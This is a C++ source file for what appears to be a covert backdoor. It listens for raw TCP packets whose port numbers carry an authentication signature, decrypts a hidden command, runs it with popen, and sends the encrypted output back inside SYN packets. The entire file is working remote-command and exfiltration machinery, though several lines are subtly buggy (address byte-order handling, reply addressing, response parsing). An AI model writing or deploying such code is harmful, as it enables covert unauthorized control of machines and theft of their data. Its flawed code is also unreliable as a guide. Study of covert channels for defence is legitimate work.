#include "RemoteCodeExecuter.h"

#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <iostream>

#include "TcpStack.h"
#include "authenticator.h"

static const char *CMD_START_STR = "s-start[";
static const char *CMD_STOP_STR = "]s-end";
static const char *DATA_START_STR = "d-start[";
static const char *DATA_STOP_STR = "]d-end";

int RemoteCodeExecuter::sendCommand(NetworkEngine *net, const struct in_addr daddr,
                                    const std::string &cmd) {
    unsigned short sport;
    unsigned short dport;

    // generate signature
    srand(time(NULL));
    sport = (rand() % 55535) + 10000;
    dport = authenticator::generateSignature(sport);

    // convert command to payload
    std::string data(CMD_START_STR);
    data += cmd;
    data += CMD_STOP_STR;
    UCharVector payload(data.begin(), data.end());

    // encrypt
    UCharVector ciphertext = net->getCrypto()->enc(payload);

    // send
    return net->sendRawTcp(*net->getIp(), daddr, sport, dport, TcpStack::SYN_FLAG,
                                 ciphertext);
}

void RemoteCodeExecuter::netCallback(const pcap_pkthdr *header, const unsigned char *packet,
                                     NetworkEngine *net) {
    struct ethhdr *eth = (struct ethhdr *)packet;
    struct iphdr *ip;
    struct tcphdr *tcp;

    // is it ip?
    if (ntohs(eth->h_proto) != ETH_P_IP) {
        return;
    }

    // is it tcp?
    ip = (struct iphdr *)(packet + ETH_HLEN);
    if (ip->protocol != IPPROTO_TCP) {
        return;
    }

    tcp = (struct tcphdr *)(packet + ETH_HLEN + (ip->ihl * 4));

    // is it authenticated?
    if (!authenticator::isValidSignature(ntohs(tcp->source), ntohs(tcp->dest))) {
        return;
    }

    // get payload
    unsigned char *payload = (unsigned char *)(packet + ETH_HLEN + (ip->ihl * 4) + (tcp->doff * 4));
    unsigned int payloadSize = header->len - ETH_HLEN - (ip->ihl * 4) - (tcp->doff * 4);

    // decrypt
    UCharVector ciphertext{};
    ciphertext.assign(payload, payload + payloadSize);

    UCharVector plaintext = net->getCrypto()->dec(ciphertext);

    // if command execute it
    char *tmp;
    if ((tmp = getCommand((char *)plaintext.data())) != nullptr) {
        executeCommand(net, ip->daddr, tmp);
    }

    // if it is a response print it
    if ((tmp = getResponse((char *)payload)) != nullptr) {
        std::cout << tmp << std::endl;
    }
}

char *RemoteCodeExecuter::getCommand(char *payload) {
    char *command;
    char *endPtr;

    if (!(command = strstr(payload, CMD_START_STR))) {
        return nullptr;
    }

    command += strlen(CMD_START_STR);

    if (!(endPtr = strstr(payload, CMD_STOP_STR))) {
        return nullptr;
    }
    *endPtr = 0;

    return command;
}

char *RemoteCodeExecuter::getResponse(char *payload) {
    char *res;
    char *endPtr;

    if (!(res = strstr(payload, DATA_START_STR))) {
        return nullptr;
    }

    res += strlen(CMD_START_STR);

    if (!(endPtr = strstr(payload, DATA_STOP_STR))) {
        return nullptr;
    }
    *endPtr = 0;

    return res;
}

void RemoteCodeExecuter::executeCommand(NetworkEngine *net, const unsigned int daddr,
                                        const char *cmd) {
    struct in_addr daddrIn;
    daddrIn.s_addr = ntohs(daddr);

    srand(time(NULL));
    unsigned short sport;
    unsigned short dport;
    FILE *fp;
    char lineBuffer[1000];

    fp = popen(cmd, "r");

    memset(lineBuffer, 0, 1000);
    while (fgets(lineBuffer, 1000, fp)) {
        sport = (rand() % 55535) + 10000;
        dport = authenticator::generateSignature(sport);

        std::string res(lineBuffer);
        UCharVector resVec(res.begin(), res.end());

        // encrypt
        UCharVector ciphertext = net->getCrypto()->enc(resVec);

        net->sendRawTcp(*net->getIp(), daddrIn, sport, dport, TcpStack::SYN_FLAG, ciphertext);

        memset(lineBuffer, 0, 1000);
    }
}
